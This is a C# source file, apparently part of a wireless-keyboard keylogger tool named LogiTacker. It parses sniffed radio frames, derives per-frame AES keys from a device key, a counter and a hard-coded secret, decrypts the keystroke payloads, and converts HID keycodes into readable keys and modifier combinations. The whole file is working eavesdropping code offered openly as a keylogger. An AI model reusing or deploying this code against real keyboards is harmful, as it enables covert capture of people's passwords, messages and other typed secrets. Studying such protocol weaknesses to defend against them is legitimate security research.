using System;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;

namespace LogiTackerKeylogger {
    class AirFrame {
        public byte[] address { get; }
        public byte pid { get; }
        public byte rf_channel { get; }
        public sbyte rssi { get; }
        public byte payloadLength { get; }
        public byte[] payload { get; }


        private static byte[] LittleKnownSecret = { 0x04,0x14,0x1d,0x1f,0x27,0x28,0x0d,0xde,0xad,0xbe,0xef,0x0a,0x0d,0x13,0x26,0x0e };

        public AirFrame(byte[] inputReportBuffer) {
            address = new byte[8];
            Array.Copy(inputReportBuffer,0,address,0,8);

            pid = inputReportBuffer[8];
            rf_channel = inputReportBuffer[9];
            rssi = (sbyte)inputReportBuffer[10];
            payloadLength = inputReportBuffer[11];

            if(payloadLength == 0)
                return;

            payload = new byte[payloadLength];
            Array.Copy(inputReportBuffer,12,payload,0,payloadLength);
        }

        public string toString(bool decrypt = false) {
            string output = "-------------------------\n";
            output += "Address: " + BitConverter.ToString(address).Replace("-",":") + "\n";
            output += "PID: " + pid.ToString() + "\n";
            output += "Ch: " + rf_channel.ToString() + "\n";
            output += "RSSI: " + rssi.ToString() + "\n";
            output += "Payload Size: " + payloadLength.ToString().Replace("-","");

            if(payloadLength == 0) {
                return output;
            }

            output += "\nPayload: " + BitConverter.ToString(payload);
            return output;
        }

        private byte[] CryptoAES_ECB_Encrypt(byte[] Key,byte[] Plain) {
            using(Aes AES = Aes.Create()) {

                AES.Key = Key;
                AES.IV = new byte[16];
                AES.Mode = CipherMode.ECB;
                AES.Padding = PaddingMode.None;

                ICryptoTransform encryptor = AES.CreateEncryptor();
                return encryptor.TransformFinalBlock(Plain,0,Plain.Length);
            }
        }

        private byte[] CalculateFrameKey(byte[] DeviceKey,byte[] Counter) {
            Array.Copy(Counter,0,LittleKnownSecret,7,4);
            return CryptoAES_ECB_Encrypt(DeviceKey,LittleKnownSecret);
        }

        public byte[] DecryptKeyboardFrame(byte[] DeviceKey) {

            //Check arguments
            if(DeviceKey == null || payload == null || payloadLength != 22)
                throw new ArgumentNullException();

            //Check if HEAD matches
            if((payload[1] & 0x1F) != 0x13)
                throw new ArgumentOutOfRangeException();

            //Extract counter
            byte[] Counter = new byte[4];
            Array.Copy(payload,10,Counter,0,4);

            //Generate frame key
            byte[] FrameKey = CalculateFrameKey(DeviceKey,Counter);
            byte[] Result = new byte[8];

            //Copy cipher part to result
            Array.Copy(payload,2,Result,0,8);

            //XOR decrypt with relevant part of AES key
            for(sbyte i = 0; i < 8; i++)
                Result[i] ^= FrameKey[i];

            return Result;
        }

    }

    class KeyboardLayout {
        public KeyboardLayout() { }

        string ByteToKey(byte input) {
            switch(input) {
                case 0x00:
                    return "None";
                case 0x01:
                    return "Error Rollover";
                case 0x02:
                    return "Post Fail";
                case 0x03:
                    return "Error Undefined";
                case 0x04:
                    return "A";
                case 0x05:
                    return "B";
                case 0x06:
                    return "C";
                case 0x07:
                    return "D";
                case 0x08:
                    return "E";
                case 0x09:
                    return "F";
                case 0x0A:
                    return "G";
                case 0x0B:
                    return "H";
                case 0x0C:
                    return "I";
                case 0x0D:
                    return "J";
                case 0x0E:
                    return "K";
                case 0x0F:
                    return "L";
                case 0x10:
                    return "M";
                case 0x11:
                    return "N";
                case 0x12:
                    return "O";
                case 0x13:
                    return "P";
                case 0x14:
                    return "Q";
                case 0x15:
                    return "R";
                case 0x16:
                    return "S";
                case 0x17:
                    return "T";
                case 0x18:
                    return "U";
                case 0x19:
                    return "V";
                case 0x1A:
                    return "W";
                case 0x1B:
                    return "X";
                case 0x1C:
                    return "Y";
                case 0x1D:
                    return "Z";
                case 0x1E:
                    return "1";
                case 0x1F:
                    return "2";
                case 0x20:
                    return "3";
                case 0x21:
                    return "4";
                case 0x22:
                    return "5";
                case 0x23:
                    return "6";
                case 0x24:
                    return "7";
                case 0x25:
                    return "8";
                case 0x26:
                    return "9";
                case 0x27:
                    return "0";

                case 0x28:
                    return "ENTER";
                case 0x29:
                    return "ESC";
                case 0x2A:
                    return "BACKSPACE";
                case 0x2B:
                    return "TAB";
                case 0x2C:
                    return "SPACE";
                case 0x2D:
                    return "-";
                case 0x2E:
                    return "=";

                case 0x36:
                    return ",";
                case 0x37:
                    return ".";
                case 0x38:
                    return "/";
                case 0x39:
                    return "CAPS LOCK";

                case 0x4F:
                    return "RIGHT";
                case 0x50:
                    return "LEFT";
                case 0x51:
                    return "DOWN";
                case 0x52:
                    return "UP";

                case 0xE0:
                    return "LEFT CTRL";
                case 0xE1:
                    return "LEFT SHIFT";
                case 0xE2:
                    return "LEFT ALT";
                case 0xE4:
                    return "RIGHT CTRL";
                case 0xE5:
                    return "RIGHT SHIFT";
                case 0xE6:
                    return "RIGHT ALT";

                default:
                    return "WIP";
            }
        }


        public bool isKeyup(byte[] decryptedKeyboardFrame) {
            bool keyup = true;
            for(sbyte i = 1; i < 7; i++)
                if(decryptedKeyboardFrame[i] != 0x00)
                    keyup = false;
            return keyup;
        }

        public bool hasModKey(byte[] decryptedKeyboardFrame) {
            return decryptedKeyboardFrame[0] != 0x00;
        }


        public string ToKey(byte[] decryptedKeyboardFrame) {
            string output = "";
            for(sbyte i = 1; i < 7; i++)
                if(decryptedKeyboardFrame[i] != 0x00)
                    output += ByteToKey(decryptedKeyboardFrame[i]);
            return output;
        }

        public string ToModKey(byte[] decryptedKeyboardFrame) {
            string output = "[";

            bool firstMod = true;
            byte modcode = decryptedKeyboardFrame[0];

            if((modcode & 0x01) > 0) {
                if(firstMod) {
                    output += "LCTRL";
                    firstMod = false;
                } else {
                    output += "+LCTRL";
                }
            }

            if((modcode & 0x02) > 0) {
                if(firstMod) {
                    output += "LSHIFT";
                    firstMod = false;
                } else {
                    output += "+LSHIFT";
                }
            }

            if((modcode & 0x04) > 0) {
                if(firstMod) {
                    output += "LALT";
                    firstMod = false;
                } else {
                    output += "+LALT";
                }
            }

            if((modcode & 0x08) > 0) {
                if(firstMod) {
                    output += "LGUI";
                    firstMod = false;
                } else {
                    output += "+LGUI";
                }
            }

            if((modcode & 0x10) > 0) {
                if(firstMod) {
                    output += "RCTRL";
                    firstMod = false;
                } else {
                    output += "+RCTRL";
                }
            }

            if((modcode & 0x20) > 0) {
                if(firstMod) {
                    output += "RSHIFT";
                    firstMod = false;
                } else {
                    output += "+RSHIFT";
                }
            }

            if((modcode & 0x40) > 0) {
                if(firstMod) {
                    output += "RALT";
                    firstMod = false;
                } else {
                    output += "+RALT";
                }
            }

            if((modcode & 0x80) > 0) {
                if(firstMod) {
                    output += "RGUI";
                    firstMod = false;
                } else {
                    output += "+RGUI";
                }
            }

            return output + "]";
        }

        public string ToComboKeyPress(byte[] decryptedKeyboardFrame) {
            string output = "";
            if(hasModKey(decryptedKeyboardFrame))
                output += ToModKey(decryptedKeyboardFrame);
            output += ToKey(decryptedKeyboardFrame);

            return output;
        }
    }
}